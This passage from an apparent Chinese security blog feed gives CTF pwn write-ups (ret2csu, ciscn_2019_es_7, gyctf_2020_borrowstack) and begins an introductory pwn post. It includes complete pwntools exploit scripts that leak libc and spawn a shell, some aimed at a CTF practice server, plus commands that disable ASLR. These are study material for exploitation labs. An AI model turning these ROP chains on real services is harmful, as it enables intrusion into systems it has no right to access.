buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">512</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关闭栈保护并进行编译</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -<span class="keyword">g</span> -fno-<span class="keyword">stack</span>-protector —z execstack -o <span class="keyword">test</span>.c <span class="keyword">test</span></span><br></pre></td></tr></table></figure><p>关闭本机随机化（低配）</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo <span class="number">0</span> &gt; <span class="regexp">/proc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space</span><br></pre></td></tr></table></figure><p>checksec看看<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230728162434881.png" alt="image-20230728162434881"></p><p>可以看到PIE还打开（但我们关闭了本机上的地址随机化可以当作PIEdisable）<br>相当于用</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-<span class="keyword">stack</span>-protector -<span class="keyword">no</span>-pie -o level <span class="keyword">test</span>.c</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729002006111.png" alt="image-20230729002006111"></p><p>Go to IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729152236817.png" alt="image-20230729152236817"></p><p>下面为gadget1，上面为gadget2.（不同版本gagget2不同，需要修改）</p><p>起始地址可以用0x4006AA，因为我们并不需要add，从pop需要寄存器开始就🆗.但是需要占位（解题思路中详细解释，请看以下分析）</p><p><strong>错位获取pop rsi；pop rdi</strong><br>若只是想单纯控制pop rsi和pop rdi寄存器，可以利用ROPgadget（pop r14和pop r15对应得gadget存在于libc_csu_init中）<br>机器码为<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729004219289.png" alt="image-20230729004219289"></p><p>具体search语法</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> <span class="built_in">--opcode</span> <span class="string">5e</span></span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line"><span class="string">ROPgadget</span> <span class="built_in">--binary</span> <span class="string">level</span> | <span class="string">grep</span> <span class="string">&#x27;pop rsi&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>最终目的是执行system（‘&#x2F;bin&#x2F;sh’），NX保护开启，我们需要泄露libc函数地址(通过read&#x2F;write函数)，找到system函数写入‘&#x2F;bin&#x2F;sh’到bss段上，最后调用system函数.</p><p><strong>注意</strong><br>我们通常会把rbx的值设置成0，而rbp设置成1.这样的目的是在执行call qword ptr [r12+rbx*8]这个指令的时候，我们仅仅把r12的值给设置成指向我们想call地址的地址即可，从而不用管rbx。<br>又因为这三个指令add rbx,；cmp rbx, rbp；jnz short loc_400580，jnz是不相等时跳转，我们通常并不想跳转到0x400580这个地方，因为此刻执行这三个指令的时候，我们就是从0x400580这个地址过来的。因此rbx加一之后，我们要让它和rbp相等，因此rbp就要提前被设置成1.<br>r12要存放的就是指向（我们要跳转到那个地址）的地址。这里有个很重要的小技巧，如果你不想使用这个call，或者说你想call一个函数，但是你拿不到它的got地址，因此没法使用这个call，那就去call一个空函数（_term_proc函数）（并且要注意的是，r12的地址填写的并不是_term_proc的地址，而是指向这个函数的地址）。<br>r13,r14,r15这三个值分别对应了rdx,rsi,edi。这里要注意的是，r15最后传给的是edi,最后rdi的高四字节都是00，而低四字节才是r15里的内容。（也就是说如果想用ret2csu去把rdi里存放成一个地址是不可行的）</p><p><strong>填充图</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011314600.png" alt="image-20230729011314600"></p><p>注意gadget末尾有个ret p64（8）占位</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729011813031.png" alt="image-20230729011813031"></p><p>为什么要将system函数地址写入bss段? 因为这行代码call qword ptr [r12+rbx*8]是<u>间接跳转</u>，也就是先将r12地址的值取出来，再进行跳转(想想Lazy Binding)。最后的效果就是，从bss_addr中取出system函数的地址，再跳转到system函数处。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729012308773.png" alt="image-20230729012308773"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSeacher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400564</span></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line">gadget1 = <span class="number">0x400606</span></span><br><span class="line">gadget2 = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got)</span><br><span class="line">payload1 += p64(<span class="number">8</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">sys_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">0</span>) + p64(bss_addr)</span><br><span class="line">payload2 += p64(<span class="number">16</span>) + p64(gadget2) + cyclic(<span class="number">0x38</span>) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(sys_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh/x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload3 = cyclic(<span class="number">0x88</span>) + p64(gadget1) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr + <span class="number">8</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0</span>) + p64(gadget2) + <span class="string">&#x27;/x00&#x27;</span> * <span class="number">0x38</span> + p64(main_addr)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;/n&#x27;</span>, payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="其他题目"><a href="#其他题目" class="headerlink" title="其他题目"></a>其他题目</h3><h4 id="ciscn-2019-es-7（其实SROP）"><a href="#ciscn-2019-es-7（其实SROP）" class="headerlink" title="ciscn_2019_es_7（其实SROP）"></a>ciscn_2019_es_7（其实SROP）</h4><p>（1）checksec （名字太长就给改成a了w）</p><p>​    <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729160314382.png" alt="image-20230729160314382"></p><p>（2）Good woman IDA</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164657543.png" alt="image-20230729164657543"></p><p>  偏移0x18<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164622920.png" alt="image-20230729164622920"></p><p>查看vuln函数发现两个系统调用：read和write 以及syscall函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729164913572.png" alt="image-20230729164913572"></p><p>同时rax被改成了0x3B，对应调用execve函数.</p><p>使用ROPgadget查看可利用的gadget.<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729165814524.png" alt="image-20230729165814524"></p><p>可以看到我们只能单独控制rdi，不能控制rsi，rdx的值.那就ret2csu（当然专题废话hh）控制rdx和rsi参数，最后执行mov rax，0x3b； syscall即可.</p><p>so 难点来了：怎么把参数地址存入rdi？<br>由于我们控制不了rax的值，无法使用系统调用将其设置为0.bss段写不了，只能写入程序给我们的特定位置来了，意味着我们需要泄露栈上的地址.看看程序是否为我们提供了可以利用的代码.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171034681.png" alt="image-20230729171034681"></p><p>第三个参数为0x30</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729171514964.png" alt="image-20230729171514964"></p><p>buf距离栈顶只有10字节距离，因此write函数可以打印出栈中内容.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172115885.png" alt="image-20230729172115885"></p><p>测试只能显示48字节 gdb调式0x30刚刚好（具体之后补充）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729172330284.png" alt="image-20230729172330284"></p><p>先发送1然后gdb查看<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729224838828.png" alt="image-20230729224838828"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230729231040910.png" alt="image-20230729231040910"></p><p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p><p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了.</p><p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p><p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少.<br><img src="https://img2022.cnblogs.com/blog/2706180/202202/2706180-20220218171939424-200600591.png" alt="img"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26250</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./a&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">csu_gadget1 = <span class="number">0x40059A</span></span><br><span class="line">modify_rax = <span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2 = <span class="number">0x400580</span></span><br><span class="line">term_proc = <span class="number">0x600e50</span><span class="comment">#pwndbg&gt;search -p 地址 查找</span></span><br><span class="line">bss_addr = <span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4005a3</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">read_syscall = <span class="number">0x4004ED</span></span><br><span class="line">offset = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"></span><br><span class="line">bin_sh_addr = leak_addr - <span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>, <span class="string">&#x27;\x00&#x27;</span>).encode() + p64(csu_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(term_proc)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(csu_gadget2)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(modify_rax)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(bin_sh_addr)</span><br><span class="line">payload += p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a>gyctf_2020_borrowstack</h4><p>其实可以直接ret2libc（🤡）w 学习记录了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25408</span>)</span><br><span class="line"></span><br><span class="line">bank=<span class="number">0x0601080</span></span><br><span class="line">leave=<span class="number">0x400699</span></span><br><span class="line">puts_plt=<span class="number">0x04004E0</span></span><br><span class="line">puts_got=<span class="number">0x0601018</span></span><br><span class="line">pop_rdi=<span class="number">0x400703</span></span><br><span class="line">main=<span class="number">0x0400626</span></span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;u want&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bank)+p64(leave)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;now!&#x27;</span>)</span><br><span class="line">payload=p64(ret)*<span class="number">20</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">puts_addr=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#system=libc_base+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong>思路：</strong>利用puts函数泄露libc得到 在bss段上写入利用rop写入shellcode</p><p><strong>问题：</strong>buf只有0x10大小，如何在bss段顺利写入呢？<br><strong>Answer：</strong>buf只能覆盖到ret，但bank（）在bss段<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005633820.png"></p><p>在buf处利用leave指令劫持栈跳转到bank处，写入shellcode</p><p>（1）checksec</p><p>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731004821556.png" alt="image-20230731004821556"></p><p>（2）Lovely Woman  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005122883.png" alt="image-20230731005122883"></p><p>NX保护打开，栈上无system（）和”&#x2F;bin&#x2F;sh” -&gt;libc泄露</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731005742112.png" alt="image-20230731005742112"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span><span class="comment">#bank_addr</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>❗❗❗u1s1❗❗❗<br>不管用哪个方法，都需要考虑利用函数（bank）与got表间距离.在栈迁时需要把地址相对抬高些，防止破坏got表.</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230731155611578.png" alt="image-20230731155611578"></p><p>下附栈迁移相关资料：</p><p>[]: <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">https://www.cnblogs.com/ZIKH26/articles/15817337.html</a></p><p><strong>tips：</strong>没法泄露libc时可用one_gadget，利用在线网站</p><p>[]: <a href="https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64">https://libc.blukat.me/?q=puts:690&amp;l=libc6_2.23-0ubuntu11_amd64</a></p><p>将泄露函数（本题为puts 其他函数是否相同 有待考究）的后三位，找到libc版本</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>one_gadget libc版本</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn 知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn探索--大杂烩</title>
      <link href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p><p>CTF中pwn攻击脚本思路：</p><p>1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*<br>2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口<br>3.进行链接<br>4.构造恶意数据<br>5.发送恶意数据<br>6.使用交互函数（io.interactive（））获取flag</p><h5 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a><strong>程序的编译与链接</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p><p>linux借助文件头进行识别!（用vim打开可查看源码–&gt;%!xxd可查看十六进制表示）<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a><strong>编译过程</strong></h5><p>ls指list file即列出文件；可用ll查看文件详细内容。<br>gcc兼具编译器和汇编器的功能。<br>ctrl+alt+t 启动shell</p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" /><p>Linux环境下执行可执行文件<br>!xdd%-r 还原文件<br>rm a.out 删除<br>.&#x2F;a.out 是linux&#x2F;unix环境下gcc编译源代码(c&#x2F;c++)并连来接产生的默认执行文件名。.&#x2F;a.out表示当前目录下的a.out文件。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p><p>链接<br>动态链接：printf的代码到动态链接库里；<br>静态链接：printf中的代码直接写好在对应文件中<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>文件权限不够时如何处理得到shell</strong><br>下以python3为例</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p><p>mv命令：用户可以使用mv命令来为文件或目录改名或将文件由一个目录移入另一个目录中。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p><p>段用来标注进程、印象代码段权限。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p><p>.&#x2F;时才被读入内存<br>cache越大（M存储），cpu速度越快。</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p><p>实模式下运行（易受到攻击）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p><p>十六进制转二进制</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" 